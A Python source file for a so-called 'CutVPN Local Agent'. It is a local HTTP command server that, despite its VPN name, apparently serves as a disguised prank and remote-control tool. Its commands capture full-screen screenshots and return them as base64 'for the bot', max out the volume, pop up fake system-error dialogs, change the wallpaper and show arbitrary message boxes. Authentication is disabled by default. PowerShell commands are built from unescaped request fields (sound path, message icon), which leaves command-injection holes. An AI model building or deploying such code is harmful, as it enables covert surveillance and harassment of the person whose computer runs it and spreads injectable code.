"""
CutVPN Local Agent
==================
Слушает ТОЛЬКО на 127.0.0.1:8765 (localhost-only, не доступен из сети).
Читает конфиг из %LOCALAPPDATA%\CutVPN\agent.json.

Запуск:
    python agent.py

Зависимости: только stdlib (Python 3.10+).
Автозапуск: добавьте в startup или запускайте из CutVPN.exe.
"""

from __future__ import annotations
import base64
import ctypes
import datetime
import json
import os
import platform
import random
import shutil
import subprocess
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

# ─── Пути ────────────────────────────────────────────────────────────────────
LOCALAPPDATA = os.environ.get("LOCALAPPDATA") or str(Path.home() / "AppData" / "Local")
ROOT         = Path(LOCALAPPDATA) / "CutVPN"
CONFIG_PATH  = ROOT / "agent.json"
LOG_PATH     = ROOT / "agent.log"
SCREENS_DIR  = ROOT / "screenshots"

DEFAULT_BIND   = "127.0.0.1"
DEFAULT_PORT   = 8765
DEFAULT_SECRET = ""

ALLOWED_COMMANDS = {
    "status", "info",
    "visuals_on", "visuals_off",
    "screenshot",
    "restart",
    "volume_max", "volume_mute", "volume_set",
    "random_error",
    "wallpaper_set",
    "sound_play",
    "video_play",
    "msgbox",
    "uninstall",
}

RANDOM_ERRORS = [
    "GENSUHA.dll не найдена — перезагрузите вязанку",
    "Вязанка не отвечает на запросы уже 3 рабочих дня",
    "Гусь заблокировал доступ к системным ресурсам",
    "OSEMENIT.Bimbim временно задумался (таймаут: 47 сек)",
    "Тараканы не приняли лицензионное соглашение версии 2.8.ГУСЬ",
    "Framework по доению коровы недоступен по причине: корова",
    "Ошибка 0xGUSB: буфер переполнен вязанкой",
    "Чебурнет: соединение потеряно (нашли гуся)",
    "Ядро Чебурнета паникует: GENSUHA_NOT_FOUND",
    "Samsung кран версии 3.14.ГУСЬ перестал отвечать",
    "Клопы отказали в доступе к папке System32",
    "Ошибка авторизации: OSEMENIT.Bimbim требует паспорт",
]

# ─── Конфиг ──────────────────────────────────────────────────────────────────
def load_config() -> dict:
    if CONFIG_PATH.exists():
        try:
            return json.loads(CONFIG_PATH.read_text("utf-8"))
        except Exception:
            pass
    return {"bind": DEFAULT_BIND, "port": DEFAULT_PORT, "auth": DEFAULT_SECRET}

cfg    = load_config()
BIND   = cfg.get("bind", DEFAULT_BIND)
PORT   = int(cfg.get("port", DEFAULT_PORT))
SECRET = cfg.get("auth", DEFAULT_SECRET)

# ─── Логгер ──────────────────────────────────────────────────────────────────
ROOT.mkdir(parents=True, exist_ok=True)
SCREENS_DIR.mkdir(exist_ok=True)
_log_lock = threading.Lock()

def log(msg: str) -> None:
    line = f"[{datetime.datetime.now():%Y-%m-%d %H:%M:%S}] {msg}"
    print(line, flush=True)
    with _log_lock:
        try:
            with open(LOG_PATH, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except Exception:
            pass

# ─── Команды ─────────────────────────────────────────────────────────────────

def cmd_status(_b: dict) -> dict:
    import psutil  # type: ignore[import]  # optional
    mem = psutil.virtual_memory()
    cpu = psutil.cpu_percent(interval=.2)
    return {"message": f"CutVPN Agent online. CPU {cpu:.1f}% | RAM {mem.percent:.1f}%"}

def cmd_status_simple(_b: dict) -> dict:
    return {"message": "CutVPN Agent online — Чебурнет работает"}

def cmd_info(_b: dict) -> dict:
    uname = platform.uname()
    return {
        "message": (
            f"OS: {uname.system} {uname.release}\n"
            f"Host: {uname.node}\n"
            f"CutVPN root: {ROOT}\n"
            f"Agent: {BIND}:{PORT}\n"
            f"Log: {LOG_PATH}"
        )
    }

def cmd_visuals_on(_b: dict) -> dict:
    # Здесь: IPC к CutVPN.exe через named pipe / файл-флаг
    flag = ROOT / "visuals.flag"
    flag.write_text("on")
    return {"message": "Визуалы включены (флаг записан)"}

def cmd_visuals_off(_b: dict) -> dict:
    flag = ROOT / "visuals.flag"
    flag.write_text("off")
    return {"message": "Визуалы выключены"}

def cmd_screenshot(_b: dict) -> dict:
    ts  = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out = SCREENS_DIR / f"screen_{ts}.png"
    try:
        _screenshot_win(out)
        size = out.stat().st_size
        # Вернём base64 превью (первые 60 КБ) для бота
        data = out.read_bytes()
        b64  = base64.b64encode(data).decode()
        return {"message": str(out), "path": str(out), "base64": b64, "size": size}
    except Exception as e:
        return {"message": f"Скриншот не удался: {e}", "error": True}

def _screenshot_win(out: Path) -> None:
    """Снять скриншот через PowerShell без внешних зависимостей."""
    ps = (
        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; "
        "$s=[System.Windows.Forms.SystemInformation]::VirtualScreen; "
        "$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height); "
        "$g=[System.Drawing.Graphics]::FromImage($b); "
        f"$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size); "
        f"$b.Save('{out}'); $g.Dispose(); $b.Dispose()"
    )
    subprocess.run(
        ["powershell", "-NonInteractive", "-NoProfile", "-Command", ps],
        timeout=20, check=True, capture_output=True
    )

def cmd_restart(_b: dict) -> dict:
    exe = ROOT / "CutVPN.exe"
    if exe.exists():
        subprocess.Popen([str(exe), "--installed"])
        return {"message": "CutVPN перезапускается"}
    return {"message": "CutVPN.exe не найден", "error": True}

def cmd_volume_max(_b: dict) -> dict:
    _ps_run(
        "Add-Type -AssemblyName System.Runtime.InteropServices; "
        "$o=New-Object -ComObject WScript.Shell; "
        "1..50 | ForEach-Object { $o.SendKeys([char]175) }"
    )
    return {"message": "Громкость: 100%"}

def cmd_volume_mute(_b: dict) -> dict:
    _ps_run(
        "$o=New-Object -ComObject WScript.Shell; $o.SendKeys([char]173)"
    )
    return {"message": "Звук отключён"}

def cmd_volume_set(body: dict) -> dict:
    level = int(body.get("level", 50))
    level = max(0, min(100, level))
    # Через nircmd если есть, иначе через PowerShell Audio API
    nircmd = ROOT / "nircmd.exe"
    if nircmd.exists():
        vol = int(level / 100 * 65535)
        subprocess.Popen([str(nircmd), "setsysvolume", str(vol)])
    else:
        # Fallback: volume через wscript sendkeys (приближённо)
        presses_up = level // 2
        _ps_run(
            f"$o=New-Object -ComObject WScript.Shell; "
            f"$o.SendKeys([char]173); Start-Sleep -m 100; "
            f"1..{presses_up} | ForEach-Object {{ $o.SendKeys([char]175) }}"
        )
    return {"message": f"Громкость: ~{level}%"}

def cmd_random_error(_b: dict) -> dict:
    msg = random.choice(RANDOM_ERRORS)
    try:
        _ps_run(
            f'Add-Type -AssemblyName System.Windows.Forms; '
            f'[System.Windows.Forms.MessageBox]::Show("{msg}", '
            f'"CutVPN — Системная ошибка Чебурнета", "OK", "Error") | Out-Null'
        )
    except Exception:
        pass
    return {"message": msg}

def cmd_wallpaper_set(body: dict) -> dict:
    path = body.get("path", "")
    if not path:
        return {"message": "Не указан path к изображению", "error": True}
    wp = Path(path)
    if not wp.exists():
        return {"message": f"Файл не найден: {path}", "error": True}
    try:
        SPI_SETDESKWALLPAPER = 20
        SPIF_UPDATEINIFILE   = 0x01
        SPIF_SENDCHANGE      = 0x02
        ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, str(wp.resolve()),
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
        )
        return {"message": f"Обои установлены: {path}"}
    except Exception as e:
        return {"message": f"Ошибка обоев: {e}", "error": True}

def cmd_sound_play(body: dict) -> dict:
    path = body.get("path", "")
    if not path or not Path(path).exists():
        return {"message": f"Файл не найден: {path}", "error": True}
    _ps_run(f"(New-Object Media.SoundPlayer '{path}').PlaySync()")
    return {"message": f"Воспроизведение: {path}"}

def cmd_video_play(body: dict) -> dict:
    path = body.get("path", "")
    if not path or not Path(path).exists():
        return {"message": f"Файл не найден: {path}", "error": True}
    try:
        os.startfile(path)
        return {"message": f"Открываю видео: {path}"}
    except Exception as e:
        return {"message": f"Ошибка: {e}", "error": True}

def cmd_msgbox(body: dict) -> dict:
    title = body.get("title", "CutVPN").replace('"', "'")
    text  = body.get("text",  "Сообщение").replace('"', "'")
    icon  = body.get("icon",  "Information")  # Information / Warning / Error / Question
    _ps_run(
        f'Add-Type -AssemblyName System.Windows.Forms; '
        f'[System.Windows.Forms.MessageBox]::Show("{text}", "{title}", "OK", "{icon}") | Out-Null'
    )
    return {"message": f"Окно показано: {title}"}

def cmd_uninstall(_b: dict) -> dict:
    startup_cmd = (
        Path(os.environ.get("APPDATA", ""))
        / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        / "CutVPN.cmd"
    )
    removed = []
    if startup_cmd.exists():
        startup_cmd.unlink()
        removed.append("автозапуск")
    try:
        if ROOT.exists():
            shutil.rmtree(ROOT)
            removed.append("папка CutVPN")
    except Exception as e:
        return {"message": f"Частичное удаление ({', '.join(removed)}): {e}", "error": True}
    return {"message": f"Удалено: {', '.join(removed) or 'нечего удалять'}"}

def _ps_run(cmd: str) -> None:
    subprocess.Popen(
        ["powershell", "-NonInteractive", "-NoProfile", "-Command", cmd],
        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
    )

# ─── Диспетчер ───────────────────────────────────────────────────────────────
HANDLERS: dict[str, Any] = {
    "status":       lambda b: _try(cmd_status, b, cmd_status_simple),
    "info":         cmd_info,
    "visuals_on":   cmd_visuals_on,
    "visuals_off":  cmd_visuals_off,
    "screenshot":   cmd_screenshot,
    "restart":      cmd_restart,
    "volume_max":   cmd_volume_max,
    "volume_mute":  cmd_volume_mute,
    "volume_set":   cmd_volume_set,
    "random_error": cmd_random_error,
    "wallpaper_set":cmd_wallpaper_set,
    "sound_play":   cmd_sound_play,
    "video_play":   cmd_video_play,
    "msgbox":       cmd_msgbox,
    "uninstall":    cmd_uninstall,
}

from typing import Any, Callable

def _try(fn: Callable, body: dict, fallback: Callable) -> dict:
    try:
        return fn(body)
    except ImportError:
        return fallback(body)

# ─── HTTP-сервер ──────────────────────────────────────────────────────────────
class AgentHandler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        log(fmt % args)

    def do_GET(self):
        if self.path == "/health":
            self._ok({"status": "ok", "agent": "CutVPN", "port": PORT})
        else:
            self._err(404, "not found")

    def do_POST(self):
        if self.path != "/command":
            self._err(404, "not found")
            return

        length = int(self.headers.get("Content-Length", 0))
        raw    = self.rfile.read(length)
        try:
            body: dict = json.loads(raw)
        except Exception:
            self._err(400, "invalid json")
            return

        # Auth
        if SECRET and body.get("secret") != SECRET:
            self._err(403, "forbidden")
            return

        command = body.get("command", "").strip()
        if command not in ALLOWED_COMMANDS:
            self._err(400, f"unknown command: {command}")
            return

        log(f"CMD {command} from {self.client_address[0]}")
        try:
            result = HANDLERS[command](body)
            self._ok({"status": "ok", **result})
        except Exception as exc:
            log(f"ERROR {command}: {exc}")
            self._ok({"status": "error", "message": str(exc)})

    def _ok(self, data: dict):
        self._respond(200, data)

    def _err(self, code: int, msg: str):
        self._respond(code, {"status": "error", "message": msg})

    def _respond(self, code: int, data: dict):
        body = json.dumps(data, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "http://localhost")
        self.end_headers()
        self.wfile.write(body)


# ─── Main ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    log(f"CutVPN Agent starting on {BIND}:{PORT}")
    log(f"Root: {ROOT}")
    log(f"Auth: {'enabled' if SECRET else 'DISABLED (set auth in agent.json)'}")
    server = HTTPServer((BIND, PORT), AgentHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log("Agent stopped by user.")
        sys.exit(0)
